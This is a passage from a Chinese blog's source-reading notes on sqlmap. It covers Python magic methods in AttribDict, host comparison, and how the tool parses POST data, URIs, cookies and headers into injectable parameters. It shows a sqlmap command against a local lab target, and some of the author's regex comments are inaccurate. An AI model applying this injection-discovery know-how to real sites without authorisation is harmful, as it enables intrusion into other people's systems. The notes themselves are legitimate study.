<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, item</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Maps values to attributes</span></span><br><span class="line"><span class="string">    Only called if there *is NOT* an attribute with this name </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__getitem__(item) <span class="comment"># 通过key获取value</span></span><br><span class="line">    <span class="keyword">except</span> KeyError:</span><br><span class="line">        <span class="keyword">raise</span> AttributeError(<span class="string">&quot;unable to access item &#x27;%s&#x27;&quot;</span> % item)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">kb = AttribDict()</span><br><span class="line"><span class="built_in">print</span> kb.a</span><br></pre></td></tr></table></figure>
<p>执行<code>print kb.a</code>的时候,访问一个不存在的属性的时候,会隐式调用<code>__getattr__</code>这个super method.</p>
<p>当属性不存在的时候,<code>__getattr__</code>会raise an AttributeError exception.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>默认的<code>__getattr__</code>的报错:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeError: &#x27;AttribDict&#x27; object has no attribute &#x27;a&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>修改过的<code>__getattr__</code>的报错:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeError: unable to access item &#x27;a&#x27;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>额,效果只是让错误输出更友好而已…</p>
<hr />
<h2 id="getstate-序列化"><code>__getstate__</code> 序列化</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> self.__dict__</span><br></pre></td></tr></table></figure>
<p>代替对象的__dict__属性被保存。</p>
<p>当对象pickled，你可返回一个自定义的状态被保存。当对象unpickled时，这个状态将会被<code>__setstate__</code>使用。</p>
<hr />
<h2 id="setstate-序列化"><code>__setstate__</code> 序列化</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, <span class="built_in">dict</span></span>):</span><br><span class="line">    self.__dict__ = <span class="built_in">dict</span></span><br></pre></td></tr></table></figure>
<p>对象unpickled时，如果<code>__setstate__</code>定义对象状态会传递来代替用对象的__dict__属性。</p>
<p>这正好跟<code>__getstate__</code>手牵手：当二者都被定义了，你可以描述对象的pickled状态，任何你想要的。</p>
<hr />
<h2 id="deepcopy-深复制"><code>__deepcopy__</code> 深复制</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__deepcopy__</span>(<span class="params">self, memo</span>):</span><br><span class="line">    retVal = self.__class__()</span><br><span class="line">    memo[<span class="built_in">id</span>(self)] = retVal</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> <span class="built_in">dir</span>(self):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> attr.startswith(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">            value = <span class="built_in">getattr</span>(self, attr)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, (types.BuiltinFunctionType, types.FunctionType, types.MethodType)):</span><br><span class="line">                <span class="built_in">setattr</span>(retVal, attr, copy.deepcopy(value, memo))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> self.items():</span><br><span class="line">        retVal.__setitem__(key, copy.deepcopy(value, memo))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于简单的 object，用 shallow copy 和 deep copy 没区别</p>
</blockquote>
<blockquote>
<p>复杂的 object， 如 list 中套着 list 的情况，shallow copy 中的 子list，并未从原 object 真的「独立」出来。也就是说，如果你改变原 object 的子 list 中的一个元素，你的 copy 就会跟着一起变。这跟我们直觉上对「复制」的理解不同。</p>
</blockquote>
<p>嵌套的复杂object,为了保证数据的独立性,要尽量的使用deepcopy.</p>
<hr />
<h1>好处:</h1>
<p>kb作为一个全局的字典,保留了相关的配置信息,很多代码里都会用到这个全局的字典,暂时能想到这样的好处就是</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>大篇幅代码都用到的话,<code>dict1.key</code>比<code>dict1[&quot;key&quot;]</code>看起来更简洁.更pythonic.</p>
</li>
<li class="lvl-2">
<p>可以自定义更加友好的错误输出提示信息.</p>
</li>
<li class="lvl-2">
<p>扫描中断需要继续的话,可以自定义序列化的内容,便于自己保存对象.</p>
</li>
</ul>
<hr />
<h1>相关知识点:</h1>
<h2 id="special-method">special method:</h2>
<h3 id="特殊之处在哪呢">特殊之处在哪呢?</h3>
<p>它的特殊之处在于:</p>
<p>如果把Python当成一个<code>framework</code>的话，这些预留的特殊方法相当于接口<code>interface</code>.</p>
<p>你可以通过这些接口,使得<code>your-object</code>就跟<code>built-in object</code>高度一致,也能复用到<code>built in-object</code>原有的强大的功能.</p>
<hr />
<h2 id="有哪些类型的接口呢">有哪些类型的接口呢?</h2>
<p>可以在以下这些方面定制你自己的类:</p>
<ol>
<li class="lvl-3">
<p>构造和初始化</p>
</li>
<li class="lvl-3">
<p>控制属性访问</p>
</li>
<li class="lvl-3">
<p>创建自定义容器</p>
</li>
<li class="lvl-3">
<p>反射</p>
</li>
<li class="lvl-3">
<p>可调用的对象</p>
</li>
<li class="lvl-3">
<p>上下文管理</p>
</li>
<li class="lvl-3">
<p>创建对象描述器</p>
</li>
<li class="lvl-3">
<p>复制</p>
</li>
</ol>
<hr />
<h3 id="什么时候会用到特殊方法呢">什么时候会用到特殊方法呢?</h3>
<p><strong>原有的数据类型的功能不能满足你的要求.</strong></p>
<p>例子:</p>
<ol>
<li class="lvl-3">
<p>你可以像sqlmap这里的<code>AttribDict</code>在原生字典的基础上构造自己符合自己项目的数据类型.</p>
</li>
<li class="lvl-3">
<p>自带的<code>dict</code>是无序的,如果你想用有序的字典.你可以用<code>collections</code>模块的<code>OrderedDict</code>.而这个<code>OrderedDict</code>就是在<code>dict</code>的基础上拓展来的.</p>
</li>
</ol>
<hr />
<h2 id="dict-对象的属性系统"><code>__dict__</code> 对象的属性系统:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>对象的属性储存在对象的<code>__dict__</code>属性中</p>
</li>
<li class="lvl-2">
<p><code>__dict__</code>为一个词典，键为属性名，对应的值为属性本身.</p>
</li>
</ul>
<p>来源:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>类属性(class attribute)</code>: 类定义 or 根据类定义继承来的</p>
</li>
<li class="lvl-2">
<p><code>对象属性(object attribute)</code>: 对象实例定义的</p>
</li>
</ul>
<p>例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">bird</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    feather = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">chicken</span>(<span class="title class_ inherited__">bird</span>):</span><br><span class="line">    fly = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, age</span>):</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">summer = chicken(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bird.__dict__)</span><br><span class="line"><span class="built_in">print</span>(chicken.__dict__)</span><br><span class="line"><span class="built_in">print</span>(summer.__dict__)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bird对象属性 比如feather</span></span><br><span class="line">&#123;<span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;bird&#x27;</span> objects&gt;, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;bird&#x27;</span> objects&gt;, <span class="string">&#x27;feather&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># chicken对象属性 比如fly和__init__方法</span></span><br><span class="line">&#123;<span class="string">&#x27;fly&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__init__&#x27;</span>: &lt;function __init__ at <span class="number">0x2b91db476d70</span>&gt;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># summer对象属性 比如age</span></span><br><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>
<p>有一些属性，比如<code>__doc__</code>，并不是由我们定义的，而是由Python自动生成。</p>
<p>此外，bird类也有父类，是object类(正如我们的bird定义，<code>class bird(object)</code>)。</p>
<p>这个object类是Python中所有类的父类。</p>
<p>可以看到，<strong>Python中的属性是分层定义的</strong>，比如这里分为<code>object/bird/chicken/summer</code>这四层。</p>
<p><strong>当我们需要调用某个属性的时候，Python会一层层向上遍历，直到找到那个属性。</strong>(某个属性可能出现再不同的层被重复定义，Python向上的过程中，会选取先遇到的那一个，也就是比较低层的属性定义)。</p>
<p>当我们有一个summer对象的时候，分别查询summer对象、chicken类、bird类以及object类的属性，就可以知道summer对象所有的<code>__dict__</code>，就可以找到通过对象summer可以调用和修改的所有属性了.</p>
<p>refs: <a href="https://www.cnblogs.com/vamei/archive/2012/12/11/2772448.html">Python深入03 对象的属性</a></p>
<hr />
<h2 id="deep-copy和shadow-copy">deep copy和shadow copy:</h2>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>我们寻常意义的复制就是深复制，即将被复制对象完全再复制一遍作为独立的新个体单独存在。所以改变原有被复制对象不会对已经复制出来的新对象产生影响。</p>
</li>
<li class="lvl-2">
<p>而浅复制并不会产生一个独立的对象单独存在，他只是将原有的数据块打上一个新标签，所以当其中一个标签被改变的时候，数据块就会发生变化，另一个标签也会随之改变。这就和我们寻常意义上的复制有所不同了。</p>
</li>
</ul>
</blockquote>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>对于简单的 object，用 shallow copy 和 deep copy 没区别</p>
</li>
</ul>
</blockquote>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>复杂的 object， 如 list 中套着 list 的情况，shallow copy 中的 子list，并未从原 object 真的「独立」出来。也就是说，如果你改变原 object 的子 list 中的一个元素，你的 copy 就会跟着一起变。这跟我们直觉上对「复制」的理解不同。</p>
</li>
</ul>
</blockquote>
<p>refs: <a href="https://www.cnblogs.com/hokky/p/8476698.html">Python-copy()与deepcopy()区别</a></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/2033150/subclassing-dict-should-dict-init-be-called">Subclassing dict: should dict.<strong>init</strong>() be called?</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/yuxinleipp/article/details/7869290">Python 方法调用机制</a></p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/12627949/python-override-getstate-and-setstate">Python, override__getstate__() and <strong>setstate</strong>()</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/codingwithme/article/details/41675679">sqlmap源码阅读之基础(dict,sys)</a></p>
</li>
<li class="lvl-2">
<p><a href="http://python.jobbole.com/88367/">Python 魔术方法 - Magic Method</a></p>
</li>
<li class="lvl-2">
<p><a href="https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/a-guide-to-pythons-magic-methods.html#id13">Python 魔术方法指南</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.python.org/2/reference/datamodel.html#customizing-attribute-access">3. Data model</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/vamei/archive/2012/12/11/2772448.html">Python深入03 对象的属性</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/blackmatrix/p/5630515.html">Python新式类与经典类的区别</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.peterbe.com/plog/must__deepcopy__">When to <strong>deepcopy</strong> classes in Python</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/hokky/p/8476698.html">Python-copy()与deepcopy()区别</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap源码-checkSameHost函数的疑问</title>
    <url>/2019/63018.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>在看sqlmap源码的时候,看了它的<code>crawler</code>，用到了<code>checkSameHost</code>函数.</p>
<p>跟进到<code>lib.core.common</code>公共函数里看<code>checkSameHost</code>函数,产生了一些疑问</p>
<hr />
<h1>checkSameHost函数:</h1>
<h2 id="函数作用">函数作用</h2>
<p>用来判断一堆urls是否是相同主机的.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkSameHost</span>(<span class="params">*urls</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Returns True if all provided urls share that same host</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; checkSameHost(&#x27;http://www.target.com/page1.php?id=1&#x27;, &#x27;http://www.target.com/images/page2.php&#x27;)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; checkSameHost(&#x27;http://www.target.com/page1.php?id=1&#x27;, &#x27;http://www.target2.com/images/page2.php&#x27;)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 用了*urls可以接受任意数量的参数,并放入tuple里,由于不知道传入url的个数是多少,所以要适当的进行判断</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> urls:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(urls) == <span class="number">1</span>: <span class="comment"># 1个url不用判断</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">_</span>(<span class="params">value</span>): <span class="comment"># _ 这个用法应该是匿名函数的意思吧?</span></span><br><span class="line">            <span class="keyword">if</span> value <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\A\w+://&quot;</span>, value):</span><br><span class="line">                <span class="comment"># \A 文本开头</span></span><br><span class="line">                <span class="comment"># \w匹配英文字母、数字或下划线，等价于[a-zA-Z0-9_]。</span></span><br><span class="line">                <span class="comment"># + 量词 — 匹配 1 至 无穷 次</span></span><br><span class="line">                <span class="comment"># :// 字面匹配字符</span></span><br><span class="line">                value = <span class="string">&quot;http://%s&quot;</span> % value <span class="comment"># 没有协议的话自动加上http协议.这个判断可用来处理输入时有没带协议的情况,方便urlparse.urlparse函数进行解析</span></span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">all</span>(re.sub(<span class="string">r&quot;(?i)\Awww\.&quot;</span>, <span class="string">&quot;&quot;</span>, urlparse.urlparse(_(url) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).netloc.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]) == re.sub(</span><br><span class="line">                <span class="string">r&quot;(?i)\Awww\.&quot;</span>, <span class="string">&quot;&quot;</span>, urlparse.urlparse(_(urls[<span class="number">0</span>]) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).netloc.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]) <span class="keyword">for</span> url <span class="keyword">in</span> urls[<span class="number">1</span>:])</span><br><span class="line">                    <span class="comment"># all(iterable) Return True if all elements of the iterable are true (or if the iterable is empty)</span></span><br><span class="line">                    <span class="comment"># urlparse.urlparse(_(url) or &quot;&quot;).netloc.split(&#x27;:&#x27;)[0] 域名服务器</span></span><br><span class="line">                    <span class="comment"># 正则表达式 r&quot;(?i)\Awww\.&quot; (?!) Assert that the Regex below does not match</span></span><br><span class="line">                    <span class="comment"># www.开头的域名,www.baidu.com会被处理成baidu.com</span></span><br><span class="line">                    <span class="comment"># 遍历看,通过域名判断是否是sameHost</span></span><br></pre></td></tr></table></figure>
<h2 id="测试">测试:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>http://www.target.com/page1.php?id=1</code>, <code>http://www.target.com/images/page2.php</code></p>
<ul class="lvl-2">
<li class="lvl-6"><code>True</code></li>
</ul>
</li>
<li class="lvl-2">
<p><code>http://www.target.com/page1.php?id=1</code>, <code>http://www.target2.com/images/page2.php</code></p>
<ul class="lvl-2">
<li class="lvl-6"><code>False</code></li>
</ul>
</li>
<li class="lvl-2">
<p><code>http://xxx.com</code>,<code>http://www.xxx.com</code></p>
<ul class="lvl-2">
<li class="lvl-6"><code>True</code></li>
</ul>
</li>
<li class="lvl-2">
<p><code>http://aa.xxx.com</code>,<code>http://bb.xxx.com</code></p>
<ul class="lvl-2">
<li class="lvl-6"><code>False</code></li>
<li class="lvl-6">???</li>
</ul>
</li>
</ul>
<h2 id="疑问">疑问:</h2>
<p>很多时候,<code>http://aa.xxx.com</code>,<code>http://bb.xxx.com</code>这两个子域名是可以解析同一个ip上的,这种情况下<code>sameHost</code>判断应该为<code>True</code>才对,为什么这里为<code>False</code>呢?</p>
<h2 id="answer">answer:</h2>
<p>这里的sameHost应该是有歧义严格意义上,是否是sameHost应该通过ip来判断,但是如果url很多的话,都去其解析域名对应的ip,会消耗时间</p>
<p>广义上看,这里的sameHost应该指的是same website.</p>
<p>通过域名来判断是否是相同的网站,是ok的.</p>
<hr />
<h1>域名与ip的关系:</h1>
<p>常见的情况下,一个域名与一个ip是对应的.</p>
<p>但是<strong>域名与ip的关系不一定是一对一的关系,可以是多对一或者是一对多的关系</strong>.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>多个域名解析到一个ip:</p>
<ul class="lvl-2">
<li class="lvl-6"><a href="https://jingyan.baidu.com/article/a24b33cd55c7ba19ff002b4b.html">IIS中怎么配置虚拟主机</a></li>
<li class="lvl-6"><a href="https://segmentfault.com/q/1010000002442790">IS可否将多个域名配置到同一个IP/端口</a></li>
</ul>
</li>
<li class="lvl-2">
<p>一个域名解析到多个ip:</p>
<ul class="lvl-2">
<li class="lvl-6"><a href="https://www.cnblogs.com/cuihongyu3503319/archive/2012/07/09/2583129.html">负载均衡实现，一个域名对应多个IP地址</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap源码-请求参数的检验和解析(一)</title>
    <url>/2019/59037.html</url>
    <content><![CDATA[<h1>前言</h1>
<p>我们平时在使用sqlmap的时候,</p>
<p>一般会直接这样使用:<code>sqlmap -u http://sqlilabs:8888/Less-1/?id=1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[10:18:54] [INFO] testing if GET parameter &#x27;id&#x27; is dynamic</span><br><span class="line">[10:18:54] [INFO] confirming that GET parameter &#x27;id&#x27; is dynamic</span><br><span class="line">[10:18:54] [INFO] GET parameter &#x27;id&#x27; is dynamic</span><br></pre></td></tr></table></figure>
<p>这个时候,sqlmap会自动识别到get请求的有可测试参数<code>id</code>那么,sqlmap是如何解析到这个参数的呢?</p>
<p>重点讲解一下<code>target.py</code>下的解析请求参数函数<code>_setRequestParams()</code></p>
<h1>_setRequestParams()函数</h1>
<h2 id="函数说明">函数说明:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check and set the parameters and perform checks on &#x27;data&#x27; option for</span></span><br><span class="line"><span class="string">    HTTP method POST. </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>对请求的参数进行检验和解析.</p>
<p>这个函数是在sqlmap测试前的目标准备时做的工作.</p>
<p>可参考一下,<a href="https://zhuanlan.zhihu.com/p/43242220">sqlmap 内核分析 I: 基础流程</a></p>
<hr />
<h2 id="流程图-3">流程图:</h2>
<p><img src="https://i.loli.net/2019/08/28/tcHEIpybSNujUT2.jpg" alt="" /></p>
<blockquote>
<p>画图真累人…</p>
</blockquote>
<p>由于代码量实在有点多,下面只能挑一些重点的来讲</p>
<hr />
<h2 id="匹配并解析Post数据">匹配并解析Post数据:</h2>
<p><img src="https://i.loli.net/2019/08/28/4XiDBCEASfw2x1v.jpg" alt="" /></p>
<p><code>sqlmap</code>支持这五种数据类型</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>XML</p>
</li>
<li class="lvl-2">
<p>JSON</p>
</li>
<li class="lvl-2">
<p>JSON_LIKE</p>
</li>
<li class="lvl-2">
<p>MULTIPART</p>
</li>
<li class="lvl-2">
<p>ARRAY_LIKE</p>
</li>
</ul>
<h3 id="正则匹配">正则匹配:</h3>
<p>通过<strong>正则匹配</strong>这五种类型的数据,它们的正则表达式为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Regular expression for XML POST data</span></span><br><span class="line">XML_RECOGNITION_REGEX = <span class="string">r&quot;(?s)\A\s*&lt;[^&gt;]+&gt;(.+&gt;)?\s*\Z&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular expression used for detecting JSON POST data</span></span><br><span class="line">JSON_RECOGNITION_REGEX = <span class="string">r&#x27;(?s)\A(\s*\[)*\s*\&#123;.*&quot;[^&quot;]+&quot;\s*:\s*(&quot;[^&quot;]*&quot;|\d+|true|false|null).*\&#125;\s*(\]\s*)*\Z&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular expression used for detecting JSON-like POST data</span></span><br><span class="line">JSON_LIKE_RECOGNITION_REGEX = <span class="string">r&quot;(?s)\A(\s*\[)*\s*\&#123;.*&#x27;[^&#x27;]+&#x27;\s*:\s*(&#x27;[^&#x27;]+&#x27;|\d+).*\&#125;\s*(\]\s*)*\Z&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular expression used for detecting multipart POST data</span></span><br><span class="line">MULTIPART_RECOGNITION_REGEX = <span class="string">r&quot;(?i)Content-Disposition:[^;]+;\s*name=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regular expression used for detecting Array-like POST data</span></span><br><span class="line">ARRAY_LIKE_RECOGNITION_REGEX = <span class="string">r&quot;(\A|%s)(\w+)\[\]=.+%s\2\[\]=&quot;</span> % (DEFAULT_GET_POST_DELIMITER, DEFAULT_GET_POST_DELIMITER)</span><br></pre></td></tr></table></figure>
<h3 id="解析">解析:</h3>
<p>以解析json数据为例,</p>
<p><img src="https://i.loli.net/2019/08/28/wtYPzdE9TKfQXZc.jpg" alt="" /></p>
<p>关键是这3个正则表达式,分别解析3种模式的数据</p>
<p>简单理解为:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>模式<code>&quot;&quot;:&quot;&quot;</code></p>
</li>
<li class="lvl-2">
<p>模式<code>&quot;&quot;:数字</code></p>
</li>
<li class="lvl-2">
<p>模式<code>&quot;&quot;:true false null类型</code></p>
</li>
</ul>
<p>然后调用<code>process()</code>去解析出它的<code>参数名</code>和<code>整个参数</code>.</p>
<p><img src="https://i.loli.net/2019/08/28/yE3h29wS4ibY7G8.jpg" alt="" /></p>
<p>解析到的数据会添加到<code>hintNames列表</code></p>
<p>举2个实例方便理解.</p>
<h3 id="例子1-json数据">例子1:json数据</h3>
<p>比如现在有一段json数据.</p>
<p><img src="https://i.loli.net/2019/08/28/T7bmUAf3IpM5co9.jpg" alt="" /></p>
<p>经过解析后:</p>
<p><img src="https://i.loli.net/2019/08/28/sWjDgcXxN4O6YVH.jpg" alt="" /></p>
<p>简单的说就是,经过解析处理后,整段的json数据已经分割开来了,变成了一个个<strong>可测试的参数</strong></p>
<h3 id="例子2-MULTIPART数据">例子2:MULTIPART数据:</h3>
<p>比如现在有一段MULTIPART类型的数据.</p>
<p><img src="https://i.loli.net/2019/08/28/cEn4RwWdaOiKMCj.jpg" alt="" /></p>
<p>经过解析后，也变成了一个可测试的参数.</p>
<p><img src="https://i.loli.net/2019/08/28/nYZNQceMXvaWois.jpg" alt="" /></p>
<h3 id="总结-5">总结:</h3>
<p>sqlmap会尽可能找出你的Post数据中<strong>所有可测试参数</strong>.</p>
<hr />
<h2 id="URI注入">URI注入:</h2>
<p><img src="https://i.loli.net/2019/08/28/w7KulXg9TW3AILv.jpg" alt="" /></p>
<p><img src="https://i.loli.net/2019/08/28/zX3Ga42xeBpt5R7.jpg" alt="" /></p>
<p>通过正则匹配<code>url</code>是否符合<code>uri注入</code>的模式.</p>
<p>正则表达式:<code>r&quot;//[^/]*/([^\.*?]+)\Z&quot;</code></p>
<p>符合的情况:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>http://www.site.com/id82</code></p>
</li>
<li class="lvl-2">
<p><code>http://www.site.com/article</code></p>
</li>
</ul>
<p>不符合的情况:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>http://www.qqq.com</code></p>
</li>
<li class="lvl-2">
<p><code>http://www.site.com/article.php?id=1</code></p>
</li>
</ul>
<p>如果符合<code>uri注入</code>的模式,会提示你是否尝试进行<code>uri注入</code></p>
<h3 id="总结-6">总结:</h3>
<p>我之前简单以为<code>url</code>有参数才存在注入的可能性.</p>
<p>其实,<strong>url并非一定要带参数才有可能存在注入的,只要跟数据库交互的地方都有可能存在sqli.</strong></p>
<p>refs:<a href="https://www.secpulse.com/archives/49018.html">同花顺某站一处URI注入</a></p>
<p><img src="https://i.loli.net/2019/08/28/BAprsZDNHaKjPqz.jpg" alt="" /></p>
<hr />
<h2 id="解析cookie">解析cookie:</h2>
<p><img src="https://i.loli.net/2019/08/28/JMjVPST9nOByQUf.jpg" alt="" /></p>
<p>解析<code>cookie</code>会调用到<code>paramToDict()</code>这个函数(把参数转换为可测试参数字典),这个函数也是个大函数,就不具体讲了.可能要写一篇文章才会详细讲到.</p>
<p>比较重要的点有,<strong>一般会用<code>;</code>符号去分割解析<code>cookie</code>里面的参数.</strong></p>
<p><img src="https://i.loli.net/2019/08/28/eUmhpauV8rtE2Mx.jpg" alt="" /></p>
<p>然后形成可测试参数列表.</p>
<blockquote>
<p>sqlmap会尽可能找出你的Post数据中<strong>所有可测试参数</strong>.cookie里的每个参数都不放过.</p>
</blockquote>
<hr />
<h2 id="解析header">解析header:</h2>
<p><img src="https://i.loli.net/2019/08/28/KliaP9SxsOIX7Wn.jpg" alt="" /></p>
<p><img src="https://i.loli.net/2019/08/28/uXmTcNrst43kaI7.jpg" alt="" /></p>
<p><code>header</code>中可测试的点可能有:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>user-agent</code></p>
</li>
<li class="lvl-2">
<p><code>referer</code></p>
</li>
<li class="lvl-2">
<p><code>host</code></p>
</li>
<li class="lvl-2">
<p><code>cookie</code></p>
</li>
</ul>
<p>比如有一段数据:</p>
<p><img src="https://i.loli.net/2019/08/28/9VNkWtMmTFX3z7h.jpg" alt="" /></p>
<p>解析后的<code>header</code>中可测试的参数为</p>
<p><img src="https://i.loli.net/2019/08/28/zoQvSrAnghPCs8u.jpg" alt="" /></p>
<hr />
<h2 id="识别csrf-token">识别csrf-token:</h2>
<p><img src="https://i.loli.net/2019/08/28/nPFXazfGiUDNMoT.jpg" alt="" /></p>
<p><img src="https://i.loli.net/2019/08/28/kTpLFKgwV59AQOE.jpg" alt="" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Infixes used for automatic recognition of parameters carrying anti-CSRF tokens</span></span><br><span class="line">CSRF_TOKEN_PARAMETER_INFIXES = (<span class="string">&quot;csrf&quot;</span>, <span class="string">&quot;xsrf&quot;</span>, <span class="string">&quot;token&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>尝试在<code>header</code>数据中寻找有无<code>cstf-token</code>标记的字眼,如果有认为无法注入.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elif</span> conf.csrfToken <span class="keyword">and</span> re.search(conf.csrfToken, parameter, re.I):</span><br><span class="line">    testSqlInj = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>refs:<a href="https://www.360zhijia.com/360anquanke/178754.html">【技术分享】使用burp macros和sqlmap绕过csrf防护进行sql注入</a></p>
<blockquote>
<p>然而，一些像CSRF、tokens或者简单的的反自动化技术如在一个表单中包含一个隐藏值就能够阻止自动化工具正确的工作</p>
</blockquote>
<hr />
<h1>总结:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>sqlmap支持5种数据类型的Post数据:<code>XML</code>、<code>JSON</code>、<code>JSON_LIKE</code>、<code>MULTIPART</code>、<code>ARRAY_LIKE</code></p>
</li>
<li class="lvl-2">
<p>sqlmap会尽可能找出你的Post数据中所有可测试参数.</p>
</li>
